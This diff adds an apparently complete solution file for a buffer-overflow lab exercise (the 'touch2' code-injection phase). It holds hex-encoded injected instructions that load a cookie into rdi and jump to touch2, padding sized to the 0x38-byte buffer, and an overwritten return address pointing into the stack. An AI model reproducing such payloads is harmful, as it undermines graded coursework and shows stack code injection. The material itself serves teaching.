@@ -1,0 +1,11 @@
+48 c7 c7 03 d8 7d 1a /* cookie from .s to .d file, mov cookie into rdi */
+68 ac 15 40 00 /* push return address of touch2 */
+c3 /* return */
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00 00 /* buffer of 0x38 - the amount of bytes before it, so 0x38 - 13 bytes */
+68 9d 61 55 /* address found from getsbuf of our input string, inject exploit string */
